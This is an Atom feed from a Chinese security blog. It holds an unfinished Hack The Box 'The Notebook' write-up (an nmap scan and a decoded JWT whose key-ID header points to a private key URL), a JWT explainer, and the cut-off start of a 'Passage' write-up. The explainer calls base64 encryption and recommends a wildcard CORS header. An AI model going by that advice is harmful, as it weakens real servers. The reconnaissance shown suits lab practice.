<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>C0debreak&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2021-03-28T16:29:05.390Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>P0tato</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hackthebox--The notebook</title>
    <link href="http://yoursite.com/2021/03/29/Hackthebox--Thenotebook/"/>
    <id>http://yoursite.com/2021/03/29/Hackthebox--Thenotebook/</id>
    <published>2021-03-28T16:29:31.903Z</published>
    <updated>2021-03-28T16:29:05.390Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a>0x00 信息收集</h2><p>使用<code>nmap</code>扫描，发现80端口开放，暂且先不管10010端口</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/fnut/notebook]</span><br><span class="line">└─<span class="comment"># nmap -sC -sV -oA notebook 10.129.120.189</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-27 22:26 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.120.189</span><br><span class="line">Host is up (0.22s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT      STATE    SERVICE VERSION</span><br><span class="line">22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)</span><br><span class="line">|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)</span><br><span class="line">|_  256 c6:06:34:c7:<span class="built_in">fc</span>:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)</span><br><span class="line">80/tcp    open     http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: The Notebook - Your Note Keeper</span><br><span class="line">10010/tcp filtered rxapi</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 70.43 seconds</span><br></pre></td></tr></tbody></table></figure><p>Web页面为<code>thenotebook</code>的登录界面，尝试弱密码无果。然后发现有一个注册页面，注册了<code>user:test1/pass:test1</code>账户。注意到cookie中<code>auth</code>字段似乎是<code>JWT TOKEN</code>，具体可以参考上一篇blog。</p><a id="more"></a><figure class="highlight llvm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auth=eyJ<span class="number">0</span>eXAiOiJKV<span class="number">1</span>QiLCJhbGciOiJSUzI<span class="number">1</span>NiIsImtpZCI<span class="number">6</span>Imh<span class="number">0</span>dHA<span class="number">6</span>Ly<span class="number">9</span>sb<span class="number">2</span>NhbGhvc<span class="number">3</span>Q<span class="number">6</span>NzA<span class="number">3</span>MC<span class="number">9</span>wcml<span class="number">2</span>S<span class="number">2</span>V<span class="number">5</span>LmtleSJ<span class="number">9</span>.eyJ<span class="number">1</span><span class="keyword">c</span><span class="number">2</span>VybmFtZSI<span class="number">6</span>InRlc<span class="number">3</span>QxIiwiZW<span class="number">1</span>haWwiOiJ<span class="number">0</span>ZXN<span class="number">0</span>MUB<span class="number">0</span>ZXN<span class="number">0</span>MS<span class="number">5</span>jb<span class="number">20</span>iLCJhZG<span class="number">1</span>pbl<span class="number">9</span>jYXAiOjB<span class="number">9</span>.maMvB<span class="number">6</span>Phv<span class="number">0</span>rQdtZArJy<span class="number">0</span>G<span class="number">1</span>pAjHdueVUgvpIRmV<span class="number">6</span>JC<span class="number">7</span>oVB<span class="number">5</span>OlTSBhr<span class="number">8</span>YjfJhtGfVWQseBf<span class="number">97</span>qwOpWcwe<span class="number">0</span>C<span class="number">99</span>eN<span class="number">3</span>sYeOh<span class="number">2</span>U<span class="number">5388</span>nahK<span class="number">39</span>Q<span class="number">2</span>Il<span class="number">7</span>q<span class="number">7</span>JlA<span class="number">52</span>-n<span class="number">7</span>Nf_Dh-ABQMqUaplbZulTt<span class="number">3</span>pJeAlguLBqm<span class="number">9</span>zq<span class="number">0</span>PM<span class="number">0</span>EEg<span class="number">9</span>DXqAcfhTiUvgmDFhJCZU<span class="number">45</span>CDD<span class="number">3</span>sePoWddhpVlzS<span class="number">2</span>Qjmu<span class="number">7</span>WiEOrhdJjFIUFxAJq<span class="number">0</span>EX<span class="number">2</span>IXTtFaMSbjWGF-vyRt<span class="number">2</span>t<span class="number">7</span>s<span class="number">0</span>dIN<span class="number">4</span>v_EsSNXjEOJ<span class="number">8</span>BWvkPw<span class="number">5</span>cymz<span class="number">8</span>TCLLpmsZrmTKaBqF<span class="number">2E30</span>u<span class="number">0</span>-B<span class="number">7</span>sV<span class="number">4</span>-LP<span class="number">6</span><span class="keyword">x</span><span class="number">3</span>mabqdLt_raKTvF_c<span class="number">7</span>gKM<span class="number">6</span>wxSeh<span class="number">05</span>Byu<span class="number">3</span>s<span class="number">5</span>xP<span class="number">3</span>NBd<span class="number">6</span>wB<span class="number">9</span>k<span class="number">8</span>xotIy<span class="number">5</span>xwUFb<span class="number">7</span>vz<span class="number">1</span><span class="number">-71</span>Mx<span class="number">2</span>yIKz<span class="number">2</span>DStmZ_rzCdR<span class="number">41</span>IwomIGqDF<span class="number">1</span>RQbiT-P<span class="number">6</span>naZRojvneuegffv-Rh<span class="number">5</span>UuBND<span class="number">71</span>PUv<span class="number">6</span>k-GjtB<span class="number">5</span>TcZAvUQkCTG<span class="number">29</span>aizfVas<span class="number">8</span>yXeqPlNge-ddZzlUgG_UBI<span class="number">0</span>tLQp<span class="number">3</span>u<span class="number">6</span>VsiXm<span class="number">1</span>itRsBNf<span class="number">8</span>otCXuIMtTPin<span class="number">3</span>H<span class="number">5</span>Fqru<span class="number">0</span>rtMduGXgNInoE<span class="number">1</span>OFryo_YB-_df<span class="number">3</span>BJVJMTvCo_nJaifwBAJiOV-SnvIHOCKwdyMS<span class="number">5</span>j<span class="number">4</span>SwbHDBBxxaGBq<span class="number">8</span>Lxos<span class="keyword">i3</span>_zJaZnFL<span class="number">2</span>s<span class="number">0</span>SaJFhrHa<span class="number">8</span>YuFCqSc<span class="number">0</span>PdjOm_CQwlxyVDkdXV_m<span class="number">0</span>wspMuw<span class="number">6</span>odw</span><br></pre></td></tr></tbody></table></figure><p>使用在线JWT网站可以解析：<code>https://jwt.io/</code></p><figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Header:</span><br><span class="line">{</span><br><span class="line">  <span class="attr">"typ"</span>: <span class="string">"JWT"</span>,</span><br><span class="line">  <span class="attr">"alg"</span>: <span class="string">"RS256"</span>,</span><br><span class="line">  <span class="attr">"kid"</span>: <span class="string">"http://localhost:7070/privKey.key"</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Payload:</span><br><span class="line">{</span><br><span class="line">  <span class="attr">"username"</span>: <span class="string">"test1"</span>,</span><br><span class="line">  <span class="attr">"email"</span>: <span class="string">"test1@test1.com"</span>,</span><br><span class="line">  <span class="attr">"admin_cap"</span>: <span class="number">0</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>未完待续~</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-信息收集&quot;&gt;&lt;a href=&quot;#0x00-信息收集&quot; class=&quot;headerlink&quot; title=&quot;0x00 信息收集&quot;&gt;&lt;/a&gt;0x00 信息收集&lt;/h2&gt;&lt;p&gt;使用&lt;code&gt;nmap&lt;/code&gt;扫描，发现80端口开放，暂且先不管10010端口&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;┌──(root💀kali)-[/home/fnut/notebook]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;└─&lt;span class=&quot;comment&quot;&gt;# nmap -sC -sV -oA notebook 10.129.120.189&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-27 22:26 EDT&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Nmap scan report &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; 10.129.120.189&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Host is up (0.22s latency).&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Not shown: 997 closed ports&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;PORT      STATE    SERVICE VERSION&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| ssh-hostkey: &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|_  256 c6:06:34:c7:&lt;span class=&quot;built_in&quot;&gt;fc&lt;/span&gt;:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;80/tcp    open     http    nginx 1.14.0 (Ubuntu)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|_http-title: The Notebook - Your Note Keeper&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10010/tcp filtered rxapi&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Nmap &lt;span class=&quot;keyword&quot;&gt;done&lt;/span&gt;: 1 IP address (1 host up) scanned &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; 70.43 seconds&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;Web页面为&lt;code&gt;thenotebook&lt;/code&gt;的登录界面，尝试弱密码无果。然后发现有一个注册页面，注册了&lt;code&gt;user:test1/pass:test1&lt;/code&gt;账户。注意到cookie中&lt;code&gt;auth&lt;/code&gt;字段似乎是&lt;code&gt;JWT TOKEN&lt;/code&gt;，具体可以参考上一篇blog。&lt;/p&gt;
    
    </summary>
    
      <category term="Hackthebox" scheme="http://yoursite.com/categories/Hackthebox/"/>
    
    
      <category term="Hackthebox" scheme="http://yoursite.com/tags/Hackthebox/"/>
    
  </entry>
  
  <entry>
    <title>JSON WEB TOKEN</title>
    <link href="http://yoursite.com/2021/03/28/JSON-WEB-TOKEN/"/>
    <id>http://yoursite.com/2021/03/28/JSON-WEB-TOKEN/</id>
    <published>2021-03-28T15:33:08.357Z</published>
    <updated>2021-03-28T15:41:31.375Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-什么是JWT"><a href="#0x00-什么是JWT" class="headerlink" title="0x00 什么是JWT"></a>0x00 什么是JWT</h2><blockquote><p>Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（<a href="https://tools.ietf.org/html/rfc7519" target="_blank" rel="noopener">(RFC 7519</a>).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p></blockquote><h2 id="0x01-起源"><a href="#0x01-起源" class="headerlink" title="0x01 起源"></a>0x01 起源</h2><p>说起JWT，我们应该来谈一谈基于token的认证和传统的session认证的区别。</p><h3 id="传统的session认证"><a href="#传统的session认证" class="headerlink" title="传统的session认证"></a>传统的session认证</h3><p>我们知道，http协议本身是一种无状态的协议，而这就意味着如果用户向我们的应用提供了用户名和密码来进行用户认证，那么下一次请求时，用户还要再一次进行用户认证才行，因为根据http协议，我们并不能知道是哪个用户发出的请求，所以为了让我们的应用能识别是哪个用户发出的请求，我们只能在服务器存储一份用户登录的信息，这份登录信息会在响应时传递给浏览器，告诉其保存为cookie,以便下次请求时发送给我们的应用，这样我们的应用就能识别请求来自哪个用户了,这就是传统的基于session认证。</p><p>但是这种基于session的认证使应用本身很难得到扩展，随着不同客户端用户的增加，独立的服务器已无法承载更多的用户，而这时候基于session认证应用的问题就会暴露出来。</p><a id="more"></a><h3 id="基于session认证所显露的问题"><a href="#基于session认证所显露的问题" class="headerlink" title="基于session认证所显露的问题"></a>基于session认证所显露的问题</h3><p><strong>Session</strong>: 每个用户经过我们的应用认证之后，我们的应用都要在服务端做一次记录，以方便用户下次请求的鉴别，通常而言session都是保存在内存中，而随着认证用户的增多，服务端的开销会明显增大。</p><p><strong>扩展性</strong>: 用户认证之后，服务端做认证记录，如果认证的记录被保存在内存中的话，这意味着用户下次请求还必须要请求在这台服务器上,这样才能拿到授权的资源，这样在分布式的应用上，相应的限制了负载均衡器的能力。这也意味着限制了应用的扩展能力。</p><p><strong>CSRF</strong>: 因为是基于cookie来进行用户识别的, cookie如果被截获，用户就会很容易受到跨站请求伪造的攻击。</p><h2 id="0x02-基于token的鉴权机制"><a href="#0x02-基于token的鉴权机制" class="headerlink" title="0x02 基于token的鉴权机制"></a>0x02 基于token的鉴权机制</h2><p>基于token的鉴权机制类似于http协议也是无状态的，它不需要在服务端去保留用户的认证信息或者会话信息。这就意味着基于token认证机制的应用不需要去考虑用户在哪一台服务器登录了，这就为应用的扩展提供了便利。</p><p>流程上是这样的：</p><ul><li>用户使用用户名密码来请求服务器</li><li>服务器进行验证用户的信息</li><li>服务器通过验证发送给用户一个token</li><li>客户端存储token，并在每次请求时附送上这个token值</li><li>服务端验证token值，并返回数据</li></ul><p>这个token必须要在每次请求时传递给服务端，它应该保存在请求头里， 另外，服务端要支持<code>CORS(跨来源资源共享)</code>策略，一般我们在服务端这么做就可以了<code>Access-Control-Allow-Origin: *</code>。</p><p>那么我们现在回到JWT的主题上。</p><h2 id="0x03-JWT长什么样？"><a href="#0x03-JWT长什么样？" class="headerlink" title="0x03 JWT长什么样？"></a>0x03 JWT长什么样？</h2><p>JWT是由三段信息构成的，将这三段信息文本用<code>.</code>链接一起就构成了Jwt字符串。就像这样:</p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><span class="selector-class">.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9</span><span class="selector-class">.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span></span><br></pre></td></tr></tbody></table></figure><h2 id="0x04-JWT的构成"><a href="#0x04-JWT的构成" class="headerlink" title="0x04 JWT的构成"></a>0x04 JWT的构成</h2><p>第一部分我们称它为头部（header),第二部分我们称其为载荷（payload, 类似于飞机上承载的物品)，第三部分是签证（signature).</p><h3 id="header"><a href="#header" class="headerlink" title="header"></a>header</h3><p>jwt的头部承载两部分信息：</p><ul><li>声明类型，这里是jwt</li><li>声明加密的算法 通常直接使用 HMAC SHA256</li></ul><p>完整的头部就像下面这样的JSON：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">  <span class="string">'typ'</span>: <span class="string">'JWT'</span>,</span><br><span class="line">  <span class="string">'alg'</span>: <span class="string">'HS256'</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>然后将头部进行base64加密（该加密是可以对称解密的),构成了第一部分.</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span><br></pre></td></tr></tbody></table></figure><h3 id="playload"><a href="#playload" class="headerlink" title="playload"></a>playload</h3><p>载荷就是存放有效信息的地方。这个名字像是特指飞机上承载的货品，这些有效信息包含三个部分</p><ul><li>标准中注册的声明</li><li>公共的声明</li><li>私有的声明</li></ul><p><strong>标准中注册的声明</strong> (建议但不强制使用) ：</p><ul><li><strong>iss</strong>: jwt签发者</li><li><strong>sub</strong>: jwt所面向的用户</li><li><strong>aud</strong>: 接收jwt的一方</li><li><strong>exp</strong>: jwt的过期时间，这个过期时间必须要大于签发时间</li><li><strong>nbf</strong>: 定义在什么时间之前，该jwt都是不可用的.</li><li><strong>iat</strong>: jwt的签发时间</li><li><strong>jti</strong>: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击。</li></ul><p><strong>公共的声明</strong> ：<br> 公共的声明可以添加任何的信息，一般添加用户的相关信息或其他业务需要的必要信息.但不建议添加敏感信息，因为该部分在客户端可解密.</p><p><strong>私有的声明</strong> ：<br> 私有声明是提供者和消费者所共同定义的声明，一般不建议存放敏感信息，因为base64是对称解密的，意味着该部分信息可以归类为明文信息。</p><p>定义一个payload:</p><figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">  <span class="attr">"sub"</span>: <span class="string">"1234567890"</span>,</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"John Doe"</span>,</span><br><span class="line">  <span class="attr">"admin"</span>: <span class="literal">true</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>然后将其进行base64加密，得到Jwt的第二部分。</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9</span><br></pre></td></tr></tbody></table></figure><h3 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h3><p>jwt的第三部分是一个签证信息，这个签证信息由三部分组成：</p><ul><li>header (base64后的)</li><li>payload (base64后的)</li><li>secret</li></ul><p>这个部分需要base64加密后的header和base64加密后的payload使用<code>.</code>连接组成的字符串，然后通过header中声明的加密方式进行加盐<code>secret</code>组合加密，然后就构成了jwt的第三部分。</p><figure class="highlight csharp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javascript</span></span><br><span class="line"><span class="keyword">var</span> encodedString = base64UrlEncode(header) + <span class="string">'.'</span> + base64UrlEncode(payload);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> signature = HMACSHA256(encodedString, <span class="string">'secret'</span>); <span class="comment">// TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span></span><br></pre></td></tr></tbody></table></figure><p>将这三部分用<code>.</code>连接成一个完整的字符串,构成了最终的jwt:</p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><span class="selector-class">.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9</span><span class="selector-class">.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span></span><br></pre></td></tr></tbody></table></figure><p><strong>注意：secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret, 那就意味着客户端是可以自我签发jwt了。</strong></p><h3 id="如何应用"><a href="#如何应用" class="headerlink" title="如何应用"></a>如何应用</h3><p>一般是在请求头里加入<code>Authorization</code>，并加上<code>Bearer</code>标注：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">'api/user/1'</span>, {</span><br><span class="line">  headers: {</span><br><span class="line">    <span class="string">'Authorization'</span>: <span class="string">'Bearer '</span> + token</span><br><span class="line">  }</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure><p>服务端会验证token，如果验证通过就会返回相应的资源。整个流程就是这样的:</p><p><img src="https:////upload-images.jianshu.io/upload_images/1821058-2e28fe6c997a60c9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ul><li>因为json的通用性，所以JWT是可以进行跨语言支持的，像JAVA,JavaScript,NodeJS,PHP等很多语言都可以使用。</li><li>因为有了payload部分，所以JWT可以在自身存储一些其他业务逻辑所必要的非敏感信息。</li><li>便于传输，jwt的构成非常简单，字节占用很小，所以它是非常便于传输的。</li><li>它不需要在服务端保存会话信息, 所以它易于应用的扩展</li></ul><h3 id="安全相关"><a href="#安全相关" class="headerlink" title="安全相关"></a>安全相关</h3><ul><li>不应该在jwt的payload部分存放敏感信息，因为该部分是客户端可解密的部分。</li><li>保护好secret私钥，该私钥非常重要。</li><li>如果可以，请使用https协议</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-什么是JWT&quot;&gt;&lt;a href=&quot;#0x00-什么是JWT&quot; class=&quot;headerlink&quot; title=&quot;0x00 什么是JWT&quot;&gt;&lt;/a&gt;0x00 什么是JWT&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（&lt;a href=&quot;https://tools.ietf.org/html/rfc7519&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;(RFC 7519&lt;/a&gt;).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x01-起源&quot;&gt;&lt;a href=&quot;#0x01-起源&quot; class=&quot;headerlink&quot; title=&quot;0x01 起源&quot;&gt;&lt;/a&gt;0x01 起源&lt;/h2&gt;&lt;p&gt;说起JWT，我们应该来谈一谈基于token的认证和传统的session认证的区别。&lt;/p&gt;
&lt;h3 id=&quot;传统的session认证&quot;&gt;&lt;a href=&quot;#传统的session认证&quot; class=&quot;headerlink&quot; title=&quot;传统的session认证&quot;&gt;&lt;/a&gt;传统的session认证&lt;/h3&gt;&lt;p&gt;我们知道，http协议本身是一种无状态的协议，而这就意味着如果用户向我们的应用提供了用户名和密码来进行用户认证，那么下一次请求时，用户还要再一次进行用户认证才行，因为根据http协议，我们并不能知道是哪个用户发出的请求，所以为了让我们的应用能识别是哪个用户发出的请求，我们只能在服务器存储一份用户登录的信息，这份登录信息会在响应时传递给浏览器，告诉其保存为cookie,以便下次请求时发送给我们的应用，这样我们的应用就能识别请求来自哪个用户了,这就是传统的基于session认证。&lt;/p&gt;
&lt;p&gt;但是这种基于session的认证使应用本身很难得到扩展，随着不同客户端用户的增加，独立的服务器已无法承载更多的用户，而这时候基于session认证应用的问题就会暴露出来。&lt;/p&gt;
    
    </summary>
    
      <category term="Json" scheme="http://yoursite.com/categories/Json/"/>
    
    
      <category term="JWT" scheme="http://yoursite.com/tags/JWT/"/>
    
  </entry>
  
  <entry>
    <title>Hackthebox--Passage</title>
    <link href="http://yoursite.com/2021/02/27/Hackthebox--Passage/"/>
    <id>http://yoursite.com/2021/02/27/Hackthebox--Passage/</id>
    <published>2021-02-26T16:45:02.082Z</published>
    <updated>2021-02-26T16:44:25.585Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a>0x00 信息收集</h2><p>使用<code>nmap</code>进行端口扫描，发现只有以下端口开放：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -oA nmap 10.129.104.160</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-26 10:24 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.104.160</span><br><span class="line">Host is up (0.25s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT      STATE    SERVICE VERSION</span><br><span class="line">22/tcp    open     ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 